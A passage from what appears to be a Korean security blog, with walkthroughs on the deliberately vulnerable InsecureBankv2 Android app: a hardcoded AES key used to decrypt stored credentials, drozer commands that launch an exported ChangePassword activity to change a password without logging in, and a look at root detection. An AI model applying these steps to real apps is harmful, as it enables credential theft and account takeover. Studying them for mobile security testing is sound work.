class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>serverport</code> 변수에 포트 번호가 저장되어있고, <code>serverip</code> 변수에는 서버의 아이피가 저장되어있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<p><code>mySharedPreferences</code> 파일을 수정하기 위해서는 특정 모듈로만 접근이 가능합니다.</p>
<p>해당 애플리케이션에서는 <code>Dologin.java</code> 안에 <code>saveCreds()</code>함수에서 정보를 수정하고 있습니다.</p>
<br>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* DoLogin.java 일부 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">saveCreds</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> UnsupportedEncodingException, InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		SharedPreferences mySharedPreferences;</span><br><span class="line">		mySharedPreferences = getSharedPreferences(MYPREFS, Activity.MODE_PRIVATE);</span><br><span class="line">		SharedPreferences.Editor editor = mySharedPreferences.edit();</span><br><span class="line">		rememberme_username = username;</span><br><span class="line">		rememberme_password = password;</span><br><span class="line">		String base64Username = <span class="keyword">new</span> String(Base64.encodeToString(rememberme_username.getBytes(), <span class="number">4</span>));</span><br><span class="line">		CryptoClass crypt = <span class="keyword">new</span> CryptoClass();;</span><br><span class="line">		superSecurePassword = crypt.aesEncryptedString(rememberme_password);</span><br><span class="line">		editor.putString(<span class="string">&quot;EncryptedUsername&quot;</span>, base64Username);</span><br><span class="line">		editor.putString(<span class="string">&quot;superSecurePassword&quot;</span>, superSecurePassword);</span><br><span class="line">		editor.commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p>8~9 줄을 보면 아이디와 패스워드를 변수에 할당합니다.</p>
<p>10 줄을 보면 변수에 할당한 아이디를 <code>Base64</code>로 인코딩하여 저장합니다.</p>
<p>11 줄을 보면 변수에 할당한 비밀번호를 <code>AES</code>로 암호화하여 저장합니다.</p>
</blockquote>
<br>

<br>

<p><code>AES</code>로 암호화되는 <code>Cryptoclass.java</code> 파일을 확인해줍니다.</p>
<br>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Cryptoclass.java 일부 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.android.insecurebankv2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidAlgorithmParameterException;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.AlgorithmParameterSpec;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">The page that holds the logic for encryption and decryption used in the application</span></span><br><span class="line"><span class="comment">@author Dinesh Shetty</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CryptoClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	The super secret key used by the encryption function</span></span><br><span class="line">	String key = <span class="string">&quot;This is the super secret key 123&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	The initialization vector used by the encryption function</span></span><br><span class="line">	<span class="keyword">byte</span>[] ivBytes = &#123;</span><br><span class="line">		<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">	&#125;;</span><br><span class="line">	String plainText;</span><br><span class="line">	<span class="keyword">byte</span>[] cipherData;</span><br><span class="line">	String base64Text;</span><br><span class="line">	String cipherText;</span><br></pre></td></tr></table></figure>

<br>

<p><code>CryptoClass.java</code> 파일을 보면 27 번째 줄에 키가 그대로 노출되고 있는 것을 볼 수 있습니다.</p>
<br>

<br>

<h2 id="디코딩-복호화"><a href="#디코딩-복호화" class="headerlink" title="디코딩, 복호화"></a>디코딩, 복호화</h2><br>

<blockquote>
<p>아이디 : ZGluZXNo&amp;#13</p>
</blockquote>
<br>

<p><code>base64</code>로 디코딩을 해줍니다.</p>
<br>

<img src="/images/Android/로컬 암호화 이슈/base64.png">

<br>

<br>

<blockquote>
<p>비밀번호 : DTrW2VXjSoFdg0e61fHxJg==</p>
</blockquote>
<br>

<p><code>key</code>를 이용해<code>AES</code>로 복호화를 해줍니다. </p>
<br>

<img src="/images/Android/로컬 암호화 이슈/aes.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>인시큐어뱅크 앱에서는 암호화를 시켰지만 <code>고유키</code>가 그대로 노출되어 복호화를 마음대로 할 수 있었습니다.</p>
<br>

<p>이를 방지하려면 <code>key</code>를 관리하는 서버를 별도로 두고, <code>key</code>를 주기적으로 바꿔주어야 합니다.</p>
<p>그 외 <code>key</code>를 암호화하여 파일 시스템에서 관리하는 방법도 있습니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 액티비티 컴포넌트 취약점</title>
    <url>/2022/01/07/2022-01-07-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%95%A1%ED%8B%B0%EB%B9%84%ED%8B%B0%20%EC%BB%B4%ED%8F%AC%EB%84%8C%ED%8A%B8%20%EC%B7%A8%EC%95%BD%EC%A0%90/</url>
    <content><![CDATA[<h1 id="🤔-액티비티-컴포넌트-취약점"><a href="#🤔-액티비티-컴포넌트-취약점" class="headerlink" title="🤔  액티비티 컴포넌트 취약점?"></a>🤔  액티비티 컴포넌트 취약점?</h1><br>

<p>각각의 액티비티들은 독립적으로 동작합니다. 하지만 액티비티가 보안적으로 취약하게 선언되어 있으면 로직을 무시하고 강제로 액티비티를 호출하고, 그 기능을 활성화할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<h2 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h2><br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* AndroidManifest.xml */</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.android.insecurebankv2&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.SEND_SMS&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">     To retrieve OAuth 2.0 tokens or invalidate tokens to disconnect a user. This disconnect</span></span><br><span class="line"><span class="comment">     option is required to comply with the Google+ Sign-In developer policies</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.USE_CREDENTIALS&quot;</span> /&gt;</span> <span class="comment">&lt;!-- To retrieve the account name (email) as part of sign-in: --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.GET_ACCOUNTS&quot;</span> /&gt;</span> <span class="comment">&lt;!-- To auto-complete the email text field in the login form with the user&#x27;s emails --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_PROFILE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CONTACTS&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">android:uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_PHONE_STATE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">android:uses-permission</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:maxSdkVersion</span>=<span class="string">&quot;18&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">android:uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CALL_LOG&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@android:style/Theme.Holo.Light.DarkActionBar&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        android:theme=&quot;@style/AppTheme&quot;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.LoginActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.FilePrefActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_file_pref&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:windowSoftInputMode</span>=<span class="string">&quot;stateVisible|adjustResize|adjustPan&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.DoLogin&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_do_login&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.PostLogin&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_post_login&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.WrongLogin&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_wrong_login&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.DoTransfer&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_do_transfer&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.ViewStatement&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_view_statement&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.TrackUserContentProvider&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:authorities</span>=<span class="string">&quot;com.android.insecurebankv2.TrackUserContentProvider&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadCastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;theBroadcast&quot;</span> &gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.ChangePassword&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_change_password&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p><code>&lt;application&gt;</code> 안에 <code>&lt;activity&gt;</code>가 포함되어 있고 각각 선언되어 있는것으로 보입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="액티비티-정보-확인"><a href="#액티비티-정보-확인" class="headerlink" title="액티비티 정보 확인"></a>액티비티 정보 확인</h2><br>

<blockquote>
<p>dz&gt; run app.activity.info -a com.android.insecurebankv2</p>
</blockquote>
<br>

<p><code>drozer</code>로 노출된 액티비티의 정보를 확인했습니다.</p>
<br>

<img src="/images/Android/액티비티 컴포넌트 취약점/activity_info.png">

<br>

<p><code>LoginActivity</code> <code>PostLogin</code> <code>DoTransfer</code> <code>ViewStatement</code> <code>ChangePassword</code> 총 5개의 액티비티가 있으며 <code>Permission</code>이 설정되어 있지 않습니다.</p>
<br>

<br>

<h2 id="액티비티-실행"><a href="#액티비티-실행" class="headerlink" title="액티비티 실행"></a>액티비티 실행</h2><br>

<blockquote>
<p>dz&gt; run app.activity.start –component com.android.insecurebankv2 com.android.insecurebankv2.ChangePassword</p>
</blockquote>
<br>

<p><code>drozer</code>로 <code>ChangePassword</code> 액티비티를 실행시켰습니다.</p>
<br>

<img src="/images/Android/액티비티 컴포넌트 취약점/activity_start.png">

<br>

<p>액티비티를 실행 후 비밀번호를 변경할 수 없습니다. 왜냐하면 정상적으로 접근하지 않았기 때문입니다.</p>
<p>정상적으로 접근한다면 <code>Username</code>에 아이디가 입력되어있어야 합니다.</p>
<br>

<br>

<h2 id="ChangePassword-java-확인"><a href="#ChangePassword-java-확인" class="headerlink" title="ChangePassword.java 확인"></a>ChangePassword.java 확인</h2><br>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ChangePassword.java 일부 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">	setContentView(R.layout.activity_change_password);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get Server details from Shared Preference file.</span></span><br><span class="line">	serverDetails = PreferenceManager.getDefaultSharedPreferences(<span class="keyword">this</span>);</span><br><span class="line">	serverip = serverDetails.getString(<span class="string">&quot;serverip&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">	serverport = serverDetails.getString(<span class="string">&quot;serverport&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">	changePassword_text = (EditText) findViewById(R.id.editText_newPassword);</span><br><span class="line">	Intent intent = getIntent();</span><br><span class="line">	uname = intent.getStringExtra(<span class="string">&quot;uname&quot;</span>);</span><br><span class="line">	System.out.println(<span class="string">&quot;newpassword=&quot;</span> + uname);</span><br><span class="line">	textView_Username = (TextView) findViewById(R.id.textView_Username);</span><br><span class="line">	textView_Username.setText(uname);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Manage the change password button click</span></span><br><span class="line">	changePassword_button = (Button) findViewById(R.id.button_newPasswordSubmit);</span><br><span class="line">	changePassword_button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">	    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">			<span class="keyword">new</span> RequestChangePasswordTask().execute(uname);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<p><code>onCreate()</code>함수를 보면 <code>uname</code> 변수에 아이디를 넣고, 17 번째 줄을 통해 화면에 표시하고 있는것을 볼 수 있습니다.</p>
<br>

<br>

<h2 id="액티비티-실행-extra-옵션"><a href="#액티비티-실행-extra-옵션" class="headerlink" title="액티비티 실행 (extra 옵션)"></a>액티비티 실행 (extra 옵션)</h2><br>

<blockquote>
<p>dz&gt; run app.activity.start –component com.android.insecurebankv2 com.android.insecurebankv2.ChangePassword –extra string uname jack</p>
</blockquote>
<br>

<p><code>--extra</code> 옵션을 통해 <code>uname</code> 변수에 아이디를 추가하여 액티비티를 실행시켰습니다.</p>
<br>

<img src="/images/Android/액티비티 컴포넌트 취약점/activity_start_2.png">

<br>

<p><code>Username</code>에 아이디가 전달된것을 확인할 수 있습니다.</p>
<br>

<br>

<h2 id="비밀번호-변경"><a href="#비밀번호-변경" class="headerlink" title="비밀번호 변경"></a>비밀번호 변경</h2><br>

<blockquote>
<p>dz&gt; run app.activity.start –component com.android.insecurebankv2 com.android.insecurebankv2.ChangePassword --extra string uname jack</p>
</blockquote>
<br>

<p>패스워드가 정상적으로 변경되었습니다.</p>
<br>

<img src="/images/Android/액티비티 컴포넌트 취약점/change_password.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>대응 방안은 아래와 같습니다.</p>
<br>

<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>취약한 인증 메커니즘</p><p>Koun9Hwan</p>
<a href="https://koun9hwan.github.io/2022/01/05/2022-01-05-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%B7%A8%EC%95%BD%ED%95%9C%20%EC%9D%B8%EC%A6%9D%20%EB%A9%94%EC%BB%A4%EB%8B%88%EC%A6%98/#%F0%9F%94%92-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"></a>
</div></div>

<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 루팅 탐지 및 우회</title>
    <url>/2022/01/07/2022-01-07-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EB%A3%A8%ED%8C%85%20%ED%83%90%EC%A7%80%20%EB%B0%8F%20%EC%9A%B0%ED%9A%8C/</url>
    <content><![CDATA[<h1 id="🤔-루팅-탐지-및-우회"><a href="#🤔-루팅-탐지-및-우회" class="headerlink" title="🤔  루팅 탐지 및 우회?"></a>🤔  루팅 탐지 및 우회?</h1><br>

<p>리눅스 같은 경우 시스템 루트 권한을 취득 가능합니다. 하지만 안드로이드같은 경우 보안상의 이유로 루트 권한을 막아놓습니다.</p>
<p>이를 우회하여 루트 권한을 획득 시 시스템의 민감한 정보에 접근이 가능합니다. 특히 금융 애플리케이션은 루팅을 탐지하고 애플리케이션 실행을 차단하고 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<p>루팅을 탐지하기 위해 주로 체크하는 경로는 <code>/system/bin/su</code> <code>/system/xbin/su</code> <code>/system/app/superuser.apk</code> <code>/data/data/com.noshufou.android.su</code> 입니다.</p>
<br>

<br>

<h2 id="PostLogin-java"><a href="#PostLogin-java" class="headerlink" title="PostLogin.java"></a>PostLogin.java</h2><br>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* PostLogin.java */</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">showRootStatus</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> isrooted = doesSuperuserApkExist(<span class="string">&quot;/system/app/Superuser.apk&quot;</span>)||</span><br><span class="line">                doesSUexist();</span><br><span class="line">        <span class="keyword">if</span>(isrooted==<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            root_status.setText(<span class="string">&quot;Rooted Device!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            root_status.setText(<span class="string">&quot;Device not Rooted!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">doesSUexist</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Process process = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process = Runtime.getRuntime().exec(<span class="keyword">new</span> String[] &#123; <span class="string">&quot;/system/bin/which&quot;</span>, <span class="string">&quot;su&quot;</span> &#125;);</span><br><span class="line">            BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">            <span class="keyword">if</span> (in.readLine() != <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (process != <span class="keyword">null</span>) process.destroy();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">doesSuperuserApkExist</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        File rootFile = <span class="keyword">new</span> File(<span class="string">&quot;/system/app/Superuser.apk&quot;</span>);</span><br><span class="line">        Boolean doesexist = rootFile.exists();</span><br><span class="line">        <span class="keyword">if</span>(doesexist == <span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<br>

<p>로그인 하였을 때 루팅여부를 확인하는 코드입니다.</p>
<br>

<p>해당 코드에서는 <code>/system/app/</code>에서 <code>Superuser.apk</code> 유무를 확인하고, <code>/system/bin/</code> 경로에서 <code>su</code> 명령어 유무를 확인하고 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<p>현재 저는 <code>nox</code>로 구동하고 있기 때문에 <code>Superuser.apk</code>가 없습니다. 그러므로 <code>su</code> 명령어 유무로 점검을 해보았습니다.</p>
<br>

<br>

<h2 id="su-명령어-확인"><a href="#su-명령어-확인" class="headerlink" title="su 명령어 확인"></a>su 명령어 확인</h2><br>

<blockquote>
<p># ls -l su</p>
</blockquote>
<br>

<p><code>/system/xbin/</code> 경로에서 <code>su</code> 명령어를 찾았습니다.</p>
<br>

<img src="/images/Android/루팅 탐지 및 우회/su_shell.png">

<br>

<br>

<p>인시큐어뱅크 앱에서 로그인 했을 때 <code>Rooted Device!!</code> 라고 나옵니다.</p>
<br>

<img src="/images/Android/루팅 탐지 및 우회/su_nox.png">

<br>

<br>

<h2 id="root-권한-해제"><a href="#root-권한-해제" class="headerlink" title="root 권한 해제"></a>root 권한 해제</h2><br>

<blockquote>
<p># ls -l su</p>
</blockquote>
<br>

<p>root 권한을 해제 했더니 <code>su</code> 명령어가 없어졌습니다.</p>
<br>

<img src="/images/Android/루팅 탐지 및 우회/no_su_shell.png">

<br>

<br>

<p>인시큐어뱅크 앱에서는 <code>Device not Rooted!!</code> 라고 나옵니다.</p>
<br>

<img src="/images/Android/루팅 탐지 및 우회/no_su_nox.png">

<br>

<br>

